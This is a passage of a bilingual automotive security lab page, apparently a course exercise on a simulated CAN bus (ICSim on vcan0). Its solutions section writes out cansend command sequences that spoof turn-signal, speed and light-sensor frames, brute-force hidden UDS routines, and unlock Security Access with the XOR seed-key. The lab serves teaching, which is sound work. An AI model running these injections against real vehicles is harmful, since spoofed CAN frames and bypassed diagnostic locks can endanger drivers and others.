+            <div class="challenge-meta">
+              <div class="challenge-category"><span class="en">UDS Security Access</span><span class="fr">UDS Accès Sécurisé</span></div>
+              <div class="challenge-title"><span class="en">Break Security Access</span><span class="fr">Briser le Security Access</span></div>
+            </div>
+            <span class="badge badge-red">Hard</span>
+          </div>
+          <div class="challenge-body">
+
+            <p>
+              <span class="en">The UDS <strong>Security Access</strong> service (SID <code>0x27</code>) is a two-step <strong>seed-key challenge-response</strong> that gates privileged operations such as reprogramming. The ECU generates a fresh <strong>2-byte random seed</strong> on every request; you must transform it into the correct key and send it back. A wrong key returns NRC <code>0x35</code> (invalidKey). Repeated failures trigger a lockout - NRC <code>0x36</code> (exceedNumberOfAttempts) - and the ECU stops accepting key attempts until it is reset.</span>
+              <span class="fr">Le service UDS <strong>Security Access</strong> (SID <code>0x27</code>) est un <strong>challenge-réponse graine-clé</strong> en deux étapes qui protège les opérations privilégiées telles que la reprogrammation. L'ECU génère une nouvelle <strong>graine aléatoire de 2 octets</strong> à chaque requête ; vous devez la transformer en clé correcte et la renvoyer. Une mauvaise clé renvoie NRC <code>0x35</code> (invalidKey). Des échecs répétés déclenchent un verrouillage - NRC <code>0x36</code> (exceedNumberOfAttempts) - et l'ECU cesse d'accepter les tentatives de clé jusqu'à réinitialisation.</span>
+            </p>
+
+            <p>
+              <span class="en"><strong>Session prerequisite.</strong> The firmware only processes Security Access in the <strong>Secret/Programming session (<code>0x03</code>)</strong>. Attempting from any other session returns NRC <code>0x7F</code> (serviceNotSupportedInSession). Open session <code>0x03</code> before requesting the seed, and keep it alive with TesterPresent - the session times out after 3.5 seconds of silence.</span>
+              <span class="fr"><strong>Prérequis de session.</strong> Le firmware ne traite les requêtes Security Access qu'en <strong>session Secret/Programming (<code>0x03</code>)</strong>. Toute tentative depuis une autre session renvoie NRC <code>0x7F</code> (serviceNotSupportedInSession). Ouvrez la session <code>0x03</code> avant de demander la graine, et maintenez-la avec TesterPresent - la session expire après 3,5 secondes de silence.</span>
+            </p>
+
+            <p>
+              <span class="en"><strong>The key derivation algorithm - <em>barbhack_vin50</em>.</strong> The firmware XOR-s each seed byte with one of the last two ASCII characters of the VIN (the same VIN you found in challenge 04). The two characters alternate: byte 0 uses the first, byte 1 uses the second, and so on for longer seeds. Because XOR is its own inverse, the same formula also recovers the seed from a known key.</span>
+              <span class="fr"><strong>L'algorithme de dérivation de clé - <em>barbhack_vin50</em>.</strong> Le firmware XOR chaque octet de la graine avec l'un des deux derniers caractères ASCII du VIN (le même VIN trouvé au défi 04). Les deux caractères alternent : l'octet 0 utilise le premier, l'octet 1 le second, et ainsi de suite pour les graines plus longues. Comme le XOR est sa propre inverse, la même formule permet aussi de retrouver la graine depuis une clé connue.</span>
+            </p>
+
+            <!-- Algorithm formula -->
+            <div class="frame-anatomy" style="padding:1rem 1.5rem;margin:1rem 0">
+              <div class="frame-anatomy-label">Algorithm - barbhack_vin50</div>
+              <p style="font-family:var(--mono);font-size:0.85rem;margin:0.6rem 0 0.2rem;color:var(--text)">
+                key[0] = seed[0] <span style="color:var(--amber)">XOR</span> <span style="color:var(--cyan)">VIN[n-1]</span>&nbsp;&nbsp;
+              </p>
+              <p style="font-family:var(--mono);font-size:0.85rem;margin:0.2rem 0 0.6rem;color:var(--text)">
+                key[1] = seed[1] <span style="color:var(--amber)">XOR</span> <span style="color:var(--cyan)">VIN[n]</span>&nbsp;&nbsp;
+              </p>
+            </div>
+
+            <!-- Frame anatomy -->
+            <div class="frame-anatomy">
+              <div class="frame-anatomy-label"><span class="en">Step 1 - Request seed (sub-fn 0x01)</span><span class="fr">Étape 1 - Demander la graine (sous-fn 0x01)</span></div>
+              <div class="istp-row">
+                <div class="istp-label">7E0 →</div>
+                <div class="istp-cell istp-len">02<br><span style="font-size:0.6rem;opacity:0.7">LEN</span></div>
+                <div class="istp-cell istp-sid">27<br><span style="font-size:0.6rem;opacity:0.7">SID</span></div>
+                <div class="istp-cell istp-act">01<br><span style="font-size:0.6rem;opacity:0.7">RequestSeed</span></div>
+              </div>
+              <div class="frame-anatomy-label" style="margin-top:0.75rem"><span class="en">ECU response - fresh random seed (changes every session)</span><span class="fr">Réponse ECU - graine aléatoire fraîche (change à chaque session)</span></div>
+              <div class="istp-row">
+                <div class="istp-label">7E8 →</div>
+                <div class="istp-cell istp-len">04<br><span style="font-size:0.6rem;opacity:0.7">LEN</span></div>
+                <div class="istp-cell istp-sid" style="border-color:var(--green);color:var(--green);background:rgba(56,168,120,0.07)">67<br><span style="font-size:0.6rem;opacity:0.7">+RSP</span></div>
+                <div class="istp-cell istp-act">01<br><span style="font-size:0.6rem;opacity:0.7">Echo</span></div>
+                <div class="istp-cell istp-unknown">S0<br><span style="font-size:0.6rem;opacity:0.7">seed[0]</span></div>
+                <div class="istp-cell istp-unknown">S1<br><span style="font-size:0.6rem;opacity:0.7">seed[1]</span></div>
+              </div>
+              <div class="frame-anatomy-label" style="margin-top:0.75rem"><span class="en">Step 2 - Send derived key (sub-fn 0x02)</span><span class="fr">Étape 2 - Envoyer la clé dérivée (sous-fn 0x02)</span></div>
+              <div class="istp-row">
+                <div class="istp-label">7E0 →</div>
+                <div class="istp-cell istp-len">04<br><span style="font-size:0.6rem;opacity:0.7">LEN</span></div>
+                <div class="istp-cell istp-sid">27<br><span style="font-size:0.6rem;opacity:0.7">SID</span></div>
+                <div class="istp-cell istp-act">02<br><span style="font-size:0.6rem;opacity:0.7">SendKey</span></div>
+                <div class="istp-cell istp-unknown">K0<br><span style="font-size:0.6rem;opacity:0.7">S0 ⊕ VIN[n-1]</span></div>
+                <div class="istp-cell istp-unknown">K1<br><span style="font-size:0.6rem;opacity:0.7">S1 ⊕ VIN[n]</span></div>
+              </div>
+              <div class="frame-anatomy-label" style="margin-top:0.75rem"><span class="en">ECU positive response - Security Access unlocked</span><span class="fr">Réponse positive ECU - Security Access déverrouillé</span></div>
+              <div class="istp-row">
+                <div class="istp-label">7E8 →</div>
+                <div class="istp-cell istp-len">02<br><span style="font-size:0.6rem;opacity:0.7">LEN</span></div>
+                <div class="istp-cell istp-sid" style="border-color:var(--green);color:var(--green);background:rgba(56,168,120,0.07)">67<br><span style="font-size:0.6rem;opacity:0.7">+RSP</span></div>
+                <div class="istp-cell istp-act" style="border-color:var(--green);color:var(--green);background:rgba(56,168,120,0.07)">02<br><span style="font-size:0.6rem;opacity:0.7">UNLOCKED</span></div>
+              </div>
+              <div class="istp-legend">
+                <div class="istp-legend-item"><div class="istp-legend-dot" style="background:var(--cyan)"></div><span class="en">SID fixed - 0x27 request / 0x67 positive response</span><span class="fr">SID fixe - 0x27 requête / 0x67 réponse positive</span></div>
+                <div class="istp-legend-item"><div class="istp-legend-dot" style="background:var(--red)"></div><span class="en">S0 S1 - random bytes generated by the ECU each session; read them from the response</span><span class="fr">S0 S1 - octets aléatoires générés par l'ECU à chaque session ; à lire dans la réponse</span></div>
+                <div class="istp-legend-item"><div class="istp-legend-dot" style="background:var(--green)"></div><span class="en">K0 K1 - derived: K0 = S0 XOR VIN[n-1] · K1 = S1 XOR VIN[n]</span><span class="fr">K0 K1 - dérivés : K0 = S0 XOR VIN[n-1] · K1 = S1 XOR VIN[n]</span></div>
+              </div>
+            </div>
+
+            <div class="challenge-hint">
+              <strong>Hint</strong>
+              <span class="en">The seed is random - you cannot pre-compute the key.
+            </div>
+
+          </div>
+          <div class="challenge-footer">
+            <button class="sol-btn" onclick="showSolution('6')">Solution →</button>
+          </div>
+        </div>
+
+      </div><!-- end challenge-list -->
+    </div>
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════ PAGE: SOLUTIONS -->
+  <div class="page" id="page-solutions">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag"><span class="en">Worked Answers</span><span class="fr">Réponses Détaillées</span></div>
+        <h1><span class="en">LAB <span class="accent">SOLUTIONS</span></span><span class="fr"><span
+              class="accent">SOLUTIONS</span> DU LAB</span></h1>
+        <p class="hero-sub">
+          <span class="en">Full command sequences and explanations for each TO-DO challenge.</span>
+          <span class="fr">Séquences de commandes complètes et explications pour chaque défi TO-DO.</span>
+        </p>
+      </div>
+    </div>
+    <div class="content">
+
+      <!-- Solution 1 -->
+      <div class="solution-block" id="sol-1">
+        <div class="sol-header">
+          <div class="sol-num">01</div>
+          <div class="sol-title"><span class="en">Blink without keys</span><span class="fr">Clignoter sans
+              touches</span></div>
+          <div class="sol-diff easy">Easy</div>
+        </div>
+        <div class="sol-body">
+          <p><span class="en">The turn signal state is broadcast on CAN ID <code>0x188</code>, byte [0]. Value
+              <code>0x01</code> = left ON, <code>0x02</code> = right ON, <code>0x00</code> = off. To create a blink,
+              alternate between the active value and <code>0x00</code> at ~2 Hz (250 ms intervals).</span>
+            <span class="fr">L'état des clignotants est diffusé sur l'ID CAN <code>0x188</code>, octet [0]. Valeur
+              <code>0x01</code> = gauche ON, <code>0x02</code> = droite ON, <code>0x00</code> = éteint. Pour créer un
+              clignotement, alternez entre la valeur active et <code>0x00</code> à ~2 Hz (intervalles de 250 ms).</span>
+          </p>
+          <pre><code><span class="hl-dim"># Left indicator blink at ~2 Hz</span>
+while true; do
+  cansend vcan0 <span class="hl-amber">188</span>#01   <span class="hl-dim"># left ON</span>
+  sleep 0.25
+  cansend vcan0 <span class="hl-amber">188</span>#00   <span class="hl-dim"># off</span>
+  sleep 0.25
+done
+
+<span class="hl-dim"># Right indicator: replace 01 with 02</span>
+<span class="hl-dim"># Both (hazard warning): replace 01 with 03</span></code></pre>
+        </div>
+      </div>
+
+      <!-- Solution 2 -->
+      <div class="solution-block" id="sol-2">
+        <div class="sol-header">
+          <div class="sol-num">02</div>
+          <div class="sol-title"><span class="en">Exceed the speed limit</span><span class="fr">Dépasser la limite de
+              vitesse</span></div>
+          <div class="sol-diff medium">Medium</div>
+        </div>
+        <div class="sol-body">
+          <p><span class="en">The speed frame uses CAN ID <code>0x244</code>. The controls binary sends it every ~10 ms
+              with a 100 km/h cap. Inject at 5 ms to win every arbitration window. Encode 150 km/h:
+              kph_raw = 15000 = 0x3A98 → hi = 0x3A, lo = 0x98.</span>
+            <span class="fr">La trame de vitesse utilise l'ID CAN <code>0x244</code>. Le binaire controls l'envoie
+              toutes
+              les ~10 ms avec un plafond à 100 km/h. Injectez à 5 ms pour gagner chaque fenêtre d'arbitrage. Encodez
+              150 km/h : kph_raw = 15000 = 0x3A98 → hi = 0x3A, lo = 0x98.</span>
+          </p>
+          <pre><code><span class="hl-dim"># kph_raw = 150 × 100 = 15000 = 0x3A98</span>
+while true; do
+  cansend vcan0 <span class="hl-amber">244</span>#0000003A98
+  sleep 0.005   <span class="hl-dim"># 5 ms - faster than controls (~10 ms)</span>
+done
+
+        </div>
+      </div>
+
+      <!-- Solution 3 -->
+      <div class="solution-block" id="sol-3">
+        <div class="sol-header">
+          <div class="sol-num">03</div>
+          <div class="sol-title"><span class="en">Defeat the light sensor</span><span class="fr">Tromper le capteur de
+              lumière</span></div>
+          <div class="sol-diff medium">Medium</div>
+        </div>
+        <div class="sol-body">
+          <p><span class="en">The luminosity sensor broadcasts on <code>0x39C</code>, byte [3]. The ECU threshold for
+              activating headlights is ~0x60. Switch to night mode with the 'n' key in the controls window, then inject
+              a daytime value (e.g. <code>0xC2</code>) faster than the real sensor broadcasts (300 ms).</span>
+            <span class="fr">Le capteur de luminosité diffuse sur <code>0x39C</code>, octet [3]. Le seuil de l'ECU pour
+              activer les phares est ~0x60. Passez en mode nuit avec la touche 'n' dans la fenêtre de contrôle, puis
+              injectez une valeur diurne (ex. <code>0xC2</code>) plus vite que le capteur réel (300 ms).</span>
+          </p>
+          <pre><code><span class="hl-dim"># Step 1: press 's' in controls window to activate night mode</span>
+<span class="hl-dim"># Step 2: inject a bright-light reading faster than 300 ms</span>
+while true; do
+  cansend vcan0 <span class="hl-amber">39C</span>#000000C200   <span class="hl-dim"># data[3] = 0xC2 (daytime range)</span>
+  sleep 0.2                       <span class="hl-dim"># 200 ms &lt; 300 ms sensor period</span>
+done
+<span class="hl-dim"># Headlights should stay off despite night mode being active</span></code></pre>
+        </div>
+      </div>
+
+      <!-- Solution 4 -->
+      <div class="solution-block" id="sol-4">
+        <div class="sol-header">
+          <div class="sol-num">04</div>
+          <div class="sol-title"><span class="en">Retrieve the VIN</span><span class="fr">Récupérer le VIN</span></div>
+          <div class="sol-diff medium">Medium</div>
+        </div>
+        <div class="sol-body">
+          <p><span class="en">OBD-II Service 09 PID 02 requests the VIN. The 17-character response exceeds 8 bytes, so
+              it uses ISO-TP multi-frame. After the First Frame arrives, you must send a Flow Control to receive the
+              Consecutive Frames.</span>
+            <span class="fr">OBD-II Service 09 PID 02 demande le VIN. La réponse de 17 caractères dépasse 8 octets, donc
+              elle utilise l'ISO-TP multi-trame. Après la réception de la First Frame, vous devez envoyer un Flow
+              Control pour recevoir les Consecutive Frames.</span>
+          </p>
+          <pre><code><span class="hl-dim"># 1. Send the VIN request</span>
+cansend vcan0 7E0#020902
+
+<span class="hl-dim"># 2. Watch candump - First Frame arrives:</span>
+<span class="hl-dim"># 7E8#1N 12 XX XX XX XX XX XX  (total len=18, first 6 VIN bytes)</span>
+
+<span class="hl-dim"># 3. Send Flow Control to trigger Consecutive Frames</span>
+cansend vcan0 7E0#300000       <span class="hl-dim"># FC: BS=0 (all), STmin=0</span>
+
+<span class="hl-dim"># 4. Consecutive Frames arrive: (If you didn't see the response check 4.1)</span>
+<span class="hl-dim"># 7E8#2X XX XX XX XX XX XX XX  (7 more bytes)</span>
+<span class="hl-dim"># 7E8#2X XX XX XX XX XX XX XX  (last 4 bytes + padding)</span>
+
+<span class="hl-dim"># 4.1 If you are encountering errors, it is likely because the Flow Control (FC) frame is not 
+being sent quickly enough after the initial request. To ensure the timing requirements are met, 
+you can chain the commands together with a very short delay:</span>
+ cansend vcan0 7E0#020902 ; sleep 0.1 ; cansend vcan0 7E0#300000
+
+
+<span class="hl-dim"># 6. Decode: strip PCI bytes (0x21, 0x22), take 17 bytes from byte[5]–byte[21]</span>
+<span class="hl-dim"># Convert each byte from hex to ASCII → VIN string</span>
+<span class="hl-dim"> Example :
+  #CANDUMP TERMINAL :
+
+  vcan0  7E0   [3]  02 <span class="hl-amber">09</span> <span class="hl-red">02</span>  # VIN request : <span class="hl-amber">SERVICE:VehicleInfo</span> <span class="hl-red">PID:VIN</span>
+  vcan0  7E8   [8]  <span class="hl-green">10</span> <span class="hl-amber">12</span> <span class="hl-red">57 42 41 52 42 48</span> # <span class="hl-green">First Frame</span> : <span class="hl-amber">LENGTH:0x12(18Bytes)</span> <span class="hl-red">DATA:WBARBH</span>
+  vcan0  7E0   [3]  <span class="hl-green">30</span> 00 00 # <span class="hl-green">Flow Control : CTS (Continue to Send)</span>
+  vcan0  7E8   [8]  <span class="hl-amber">20</span> <span class="hl-red">41 43 4B 46 41 31 34</span> # CF1 : <span class="hl-amber">SEQ:#0</span> <span class="hl-red">DATA:ACKFA14</span>
+  vcan0  7E8   [6]  <span class="hl-amber">21</span> <span class="hl-red">39 38 35 30 00</span> # CF2 : <span class="hl-amber">SEQ:#1</span> <span class="hl-red">DATA:9850</span> <span class="hl-green">Null_Pad</span>
+
+
+</span></code></pre>
+        </div>
+      </div>
+
+      <!-- Solution 5 -->
+      <div class="solution-block" id="sol-5">
+        <div class="sol-header">
+          <div class="sol-num">05</div>
+          <div class="sol-title"><span class="en">Find the hidden routine</span><span class="fr">Trouver la routine cachée</span></div>
+          <div class="sol-diff hard">Hard</div>
+        </div>
+        <div class="sol-body">
+
+          <p><span class="en"><strong>Why manual brute-force fails.</strong> With three unknown bytes (sub-function <code>XX</code>, routine ID <code>YY</code>, activation <code>ZZ</code>), a naive <code>cansend</code> loop has no way to pair requests with responses. Frames from a previous iteration bleed into the next <code>candump</code> read, and the session times out mid-scan without a synchronized keepalive. You need proper tooling.</span>
+          <span class="fr"><strong>Pourquoi le brute-force manuel échoue.</strong> Avec trois octets inconnus (sous-fonction <code>XX</code>, ID de routine <code>YY</code>, activation <code>ZZ</code>), une boucle <code>cansend</code> naïve ne peut pas associer les requêtes aux réponses. Les trames d'une itération précédente contaminent la lecture <code>candump</code> suivante, et la session expire en plein scan sans keepalive synchronisé. Il faut un outillage approprié.</span>
+          </p>
+
+          <p><span class="en"><strong>The approach: a two-pass ISO-TP scanner.</strong></span>
+          <span class="fr"><strong>L'approche : un scanner ISO-TP en deux passes.</strong></span></p>
+
+          <p><span class="en"><strong>Step 1 - Open an ISO-TP kernel socket.</strong> Unlike raw <code>cansend</code>, a <code>SOCK_DGRAM / CAN_ISOTP</code> socket gives you synchronous <code>send()</code> / <code>recv()</code> semantics: every <code>recv()</code> returns exactly the ECU response to the last <code>send()</code>. This eliminates the frame-bleeding problem entirely.</span>
+          <span class="fr"><strong>Étape 1 - Ouvrir un socket ISO-TP noyau.</strong> Contrairement au <code>cansend</code> brut, un socket <code>SOCK_DGRAM / CAN_ISOTP</code> offre une sémantique <code>send()</code> / <code>recv()</code> synchrone : chaque <code>recv()</code> renvoie exactement la réponse ECU au dernier <code>send()</code>. Cela élimine complètement le problème de contamination de trames.</span>
+          </p>
+
+          <p><span class="en"><strong>Step 2 - TesterPresent with suppressed response.</strong> The keepalive thread sends <code>0x3E 0x80</code> every 900 ms. The <code>0x80</code> flag (suppressPositiveResponse) tells the ECU to process the frame but send <em>no reply</em> - so the <code>0x7E 0x00</code> acknowledgement never arrives on the socket and cannot pollute a subsequent <code>recv()</code>.</span>
+          <span class="fr"><strong>Étape 2 - TesterPresent avec réponse supprimée.</strong> Le thread keepalive envoie <code>0x3E 0x80</code> toutes les 900 ms. Le flag <code>0x80</code> (suppressPositiveResponse) indique à l'ECU de traiter la trame mais de n'envoyer <em>aucune réponse</em> - ainsi l'acquittement <code>0x7E 0x00</code> n'arrive jamais sur le socket et ne peut pas polluer un <code>recv()</code> ultérieur.</span>
+          </p>
+
+          <p><span class="en"><strong>Step 3 - Pass 1: sweep XX × YY with a fixed probe.</strong> The scanner sends all 128 × 256 = 32 768 combinations of <code>(XX, YY)</code> with <code>ZZ = 0x01</code>. Responses with NRC <code>0x11</code> (serviceNotSupported) or <code>0x12</code> (subFunctionNotSupported) are discarded as noise. Everything else - including <code>NRC 0x7F</code> (requestOutOfRange) - is kept as a candidate. This pass completes in under 10 seconds on <code>vcan0</code>.</span>
+          <span class="fr"><strong>Étape 3 - Passe 1 : balayer XX × YY avec une sonde fixe.</strong> Le scanner envoie les 128 × 256 = 32 768 combinaisons de <code>(XX, YY)</code> avec <code>ZZ = 0x01</code>. Les réponses avec NRC <code>0x11</code> (serviceNotSupported) ou <code>0x12</code> (subFunctionNotSupported) sont rejetées comme bruit. Tout le reste - y compris <code>NRC 0x7F</code> (requestOutOfRange) - est conservé comme candidat. Cette passe se termine en moins de 10 secondes sur <code>vcan0</code>.</span>
+          </p>
+
+          <p><span class="en"><strong>Step 4 - Pass 2: sweep all ZZ values for each candidate.</strong> For each surviving <code>(XX, YY)</code> pair, the scanner tries all 256 activation bytes. A response is only confirmed if it is a fully echo-validated positive: <code>0x71 XX YY ZZ</code> - all four bytes must match the request. This rejects stale buffered responses from Pass 1 that might otherwise cause false positives.</span>
+          <span class="fr"><strong>Étape 4 - Passe 2 : balayer toutes les valeurs ZZ pour chaque candidat.</strong> Pour chaque paire <code>(XX, YY)</code> survivante, le scanner essaie les 256 octets d'activation. Une réponse n'est confirmée que si c'est une réponse positive entièrement validée par écho : <code>0x71 XX YY ZZ</code> - les quatre octets doivent correspondre à la requête. Cela rejette les réponses obsolètes de la Passe 1 qui pourraient autrement causer des faux positifs.</span>
+          </p>
+
+          <!-- Frame anatomy in solution -->
+          <div style="margin:1.25rem 0">
+            <div class="frame-anatomy-label"><span class="en">Confirmed positive response - echo validation</span><span class="fr">Réponse positive confirmée - validation par écho</span></div>
+            <div class="istp-row">
+              <div class="istp-label">7E8 →</div>
+              <div class="istp-cell istp-len">04<br><span style="font-size:0.6rem;opacity:0.7">LEN</span></div>
+              <div class="istp-cell istp-sid" style="border-color:var(--green);color:var(--green);background:rgba(56,168,120,0.07)">71<br><span style="font-size:0.6rem;opacity:0.7">+RSP</span></div>
+              <div class="istp-cell istp-unknown">41<br><span style="font-size:0.6rem;opacity:0.7">XX echo</span></div>
+              <div class="istp-cell istp-unknown">10/22<br><span style="font-size:0.6rem;opacity:0.7">YY echo</span></div>
+              <div class="istp-cell istp-act">01/00<br><span style="font-size:0.6rem;opacity:0.7">ZZ echo</span></div>
+            </div>
+          </div>
+
+          <p><span class="en">The full scanner script - including ISO-TP socket setup, keepalive thread, two-pass logic, echo validation, and state normalization - is available on GitHub:</span>
+          <span class="fr">Le script de scanner complet - incluant la configuration du socket ISO-TP, le thread keepalive, la logique deux passes, la validation par écho et la normalisation d'état - est disponible sur GitHub :</span>
+          </p>
+
+          <div class="info-block" style="margin:0.75rem 0">
+            <div class="info-block-label">GitHub</div>
+            <p style="margin:0;font-family:var(--mono);font-size:0.82rem">
+              <a href="" target="_blank" rel="noopener" style="color:var(--cyan)">
+                <span class="en">→ ICSim UDS RoutineControl Brute-forcer</span>
+                <span class="fr">→ ICSim UDS RoutineControl Brute-forcer</span>
+              </a>
+            </p>
+          </div>
+
+          <pre><code><span class="hl-dim"># 1. Ensure the can_isotp kernel module is loaded</span>
+sudo modprobe can_isotp
+
+<span class="hl-dim"># 2. Run the scanner (requires python-can)</span>
+python3 brute_uds.py
+
+<span class="hl-dim"># Expected output:</span>
+<span class="hl-dim"># Pass 1: 32768/32768 in ~8s - N candidates</span>
+<span class="hl-dim"># Pass 2: M combinations tested</span>
+<span class="hl-dim"># === Confirmed routines ===</span>
+<span class="hl-dim">#   sub_fn=0x41  routine_id=0x10</span>
+<span class="hl-dim">#     activation=0x01  raw=71411001   ← ON</span>
+<span class="hl-dim">#     activation=0x00  raw=71411000   ← OFF</span>
+<span class="hl-dim">#   sub_fn=0x41  routine_id=0x22</span>
+<span class="hl-dim">#     activation=0x01  raw=71412201   ← ON</span>
+<span class="hl-dim">#     activation=0x00  raw=71412200   ← OFF</span>
+
+<span class="hl-dim"># 3. Trigger manually once you know the values</span>
+cansend vcan0 <span class="hl-amber">7E0</span>#021002              <span class="hl-dim"># open extended session</span>
+cansend vcan0 <span class="hl-amber">7E0</span>#<span class="hl-cyan">04</span><span class="hl-amber">31</span><span class="hl-red">41</span>1001          <span class="hl-dim"># activate routine 0x10</span>
+cansend vcan0 <span class="hl-amber">7E0</span>#<span class="hl-cyan">04</span><span class="hl-amber">31</span><span class="hl-red">41</span>2201          <span class="hl-dim"># activate routine 0x22</span></code></pre>
+
+        </div>
+      </div>
+
+      <!-- Solution 6 -->
+      <div class="solution-block" id="sol-6">
+        <div class="sol-header">
+          <div class="sol-num">06</div>
+          <div class="sol-title"><span class="en">Break Security Access</span><span class="fr">Briser le Security
+              Access</span></div>
+          <div class="sol-diff hard">Hard</div>
+        </div>
+        <div class="sol-body">
+
+          <p><span class="en"><strong>Why the seed matters.</strong> The ECU calls <code>rand()</code> to generate both seed bytes - a new pair every time you request one. You cannot pre-compute the key offline. The algorithm is fixed, but the input changes: you must read the seed from the bus, compute the XOR, and reply - all within the same session window.</span>
+          <span class="fr"><strong>Pourquoi la graine est importante.</strong> L'ECU appelle <code>rand()</code> pour générer les deux octets de graine - une nouvelle paire à chaque demande. Vous ne pouvez pas pré-calculer la clé hors ligne. L'algorithme est fixe, mais l'entrée change : vous devez lire la graine sur le bus, calculer le XOR, et répondre - le tout dans la même fenêtre de session.</span>
+          </p>
+
+          <p><span class="en"><strong>Step 1 - Open the Secret/Programming session (<code>0x03</code>).</strong> The firmware explicitly checks <code>diagSession == 0x03</code> before processing any Security Access request. Default (<code>0x01</code>) and Extended (<code>0x02</code>) sessions return NRC <code>0x7F</code> (serviceNotSupportedInSession). Send <code>02 10 03</code> and confirm the <code>50 03</code> positive response.</span>
+          <span class="fr"><strong>Étape 1 - Ouvrir la session Secret/Programming (<code>0x03</code>).</strong> Le firmware vérifie explicitement <code>diagSession == 0x03</code> avant de traiter toute requête Security Access. Les sessions Default (<code>0x01</code>) et Extended (<code>0x02</code>) renvoient NRC <code>0x7F</code> (serviceNotSupportedInSession). Envoyez <code>02 10 03</code> et confirmez la réponse positive <code>50 03</code>.</span>
+          </p>
+
+          <p><span class="en"><strong>Step 2 - Request the seed (<code>02 27 01</code>).</strong> The ECU responds with <code>04 67 01 S0 S1</code> where <code>S0</code> and <code>S1</code> are freshly randomised. Read these two bytes from the response - they are your input to the key derivation function.</span>
+          <span class="fr"><strong>Étape 2 - Demander la graine (<code>02 27 01</code>).</strong> L'ECU répond avec <code>04 67 01 S0 S1</code> où <code>S0</code> et <code>S1</code> sont fraîchement aléatoirisés. Lisez ces deux octets dans la réponse - ils sont votre entrée dans la fonction de dérivation de clé.</span>
+          </p>
+
+          <p><span class="en"><strong>Step 3 - Derive the key.</strong> Apply XOR with the ASCII values of the last two VIN characters (<code>'5'</code> = <code>0x35</code>, <code>'0'</code> = <code>0x30</code>) in alternation. This is the <em>barbhack_vin50</em> algorithm:</span>
+          <span class="fr"><strong>Étape 3 - Dériver la clé.</strong> Appliquez XOR avec les valeurs ASCII des deux derniers caractères du VIN (<code>'5'</code> = <code>0x35</code>, <code>'0'</code> = <code>0x30</code>) en alternance. C'est l'algorithme <em>barbhack_vin50</em> :</span>
+          </p>
+
+          <!-- Worked example -->
+          <div style="margin:1.25rem 0">
+            <div class="frame-anatomy-label"><span class="en">Worked example - seed 0xA7 0x1C</span><span class="fr">Exemple concret - graine 0xA7 0x1C</span></div>
+            <div class="istp-row">
+              <div class="istp-label" style="min-width:80px">seed</div>
+              <div class="istp-cell istp-unknown">A7<br><span style="font-size:0.6rem;opacity:0.7">S0</span></div>
+              <div class="istp-cell istp-unknown">1C<br><span style="font-size:0.6rem;opacity:0.7">S1</span></div>
+            </div>
+            <div class="istp-row">
+              <div class="istp-label" style="min-width:80px">XOR</div>
+              <div class="istp-cell istp-act">35<br><span style="font-size:0.6rem;opacity:0.7">'5'</span></div>
+              <div class="istp-cell istp-act">30<br><span style="font-size:0.6rem;opacity:0.7">'0'</span></div>
+            </div>
+            <div class="istp-row">
+              <div class="istp-label" style="min-width:80px">key</div>
+              <div class="istp-cell" style="border-color:var(--green);color:var(--green);background:rgba(56,168,120,0.07)">92<br><span style="font-size:0.6rem;opacity:0.7">K0</span></div>
+              <div class="istp-cell" style="border-color:var(--green);color:var(--green);background:rgba(56,168,120,0.07)">2C<br><span style="font-size:0.6rem;opacity:0.7">K1</span></div>
+            </div>
+            <p style="font-family:var(--mono);font-size:0.75rem;color:var(--text-dim);margin:0.4rem 0 0">
+              0xA7 XOR 0x35 = 0x92 &nbsp;·&nbsp; 0x1C XOR 0x30 = 0x2C &nbsp;→&nbsp; send <span style="color:var(--green)">04 27 02 92 2C</span>
+            </p>
+          </div>
+
+          <p><span class="en"><strong>Step 4 - Send the key (<code>04 27 02 K0 K1</code>).</strong> The ECU validates both bytes. On success it responds with <code>02 67 02</code> and the session becomes unlocked. On failure (wrong key) it responds with NRC <code>0x35</code> (invalidKey). After too many wrong attempts it locks with NRC <code>0x36</code> (exceedNumberOfAttempts) - restart the ECU or wait.</span>
+          <span class="fr"><strong>Étape 4 - Envoyer la clé (<code>04 27 02 K0 K1</code>).</strong> L'ECU valide les deux octets. En cas de succès, il répond avec <code>02 67 02</code> et la session est déverrouillée. En cas d'échec (mauvaise clé) il répond avec NRC <code>0x35</code> (invalidKey). Après trop de mauvaises tentatives, il se verrouille avec NRC <code>0x36</code> (exceedNumberOfAttempts) - redémarrez l'ECU ou attendez.</span>
+          </p>
+
+          <p><span class="en"><strong>Manual approach (requires you to calculate XOR by hand or with a calculator).</strong> Read the seed from <code>candump</code>, compute the XOR, assemble the <code>cansend</code> command:</span>
+          <span class="fr"><strong>Approche manuelle (nécessite de calculer le XOR à la main ou avec une calculatrice).</strong> Lisez la graine dans <code>candump</code>, calculez le XOR, assemblez la commande <code>cansend</code> :</span>
+          </p>
+
+          <pre><code><span class="hl-dim"># 1. Open Secret/Programming session (0x03)</span>
+cansend vcan0 <span class="hl-amber">7E0</span>#<span class="hl-cyan">02</span><span class="hl-amber">10</span>03
+<span class="hl-dim"># Positive response: 7E8#02 50 03</span>
+
+<span class="hl-dim"># 2. Keep the session alive while you work</span>
+<span class="hl-dim"># (send TesterPresent every ~900 ms, or use the inject tool's keepalive)</span>
+cansend vcan0 <span class="hl-amber">7E0</span>#023E80       <span class="hl-dim"># 0x80 = suppress response</span>
+
+<span class="hl-dim"># 3. Request the seed</span>
+cansend vcan0 <span class="hl-amber">7E0</span>#022701
+<span class="hl-dim"># Response: 7E8#04 67 01 S0 S1  ← read S0 and S1</span>
+
+<span class="hl-dim"># 4. Compute the key manually</span>
+<span class="hl-dim">#    K0 = S0 XOR 0x35    K1 = S1 XOR 0x30</span>
+<span class="hl-dim"># Example: seed = A7 1C → key = 92 2C</span>
+
+<span class="hl-dim"># 5. Send the computed key</span>
+cansend vcan0 <span class="hl-amber">7E0</span>#<span class="hl-cyan">04</span><span class="hl-amber">27</span>02<span class="hl-red">922C</span>   <span class="hl-dim"># replace 92 2C with YOUR computed key</span>
+<span class="hl-dim"># Positive response: 7E8#02 67 02  → UNLOCKED</span>
+<span class="hl-dim"># Negative response: 7E8#03 7F 27 35  → invalidKey (wrong computation)</span></code></pre>
+
+      <div style="margin-top:2rem">
+        <button class="sol-btn" style="padding:0.6rem 1.5rem;font-size:0.75rem" onclick="showPage('todo')">← Back to
+          TO-DO</button>
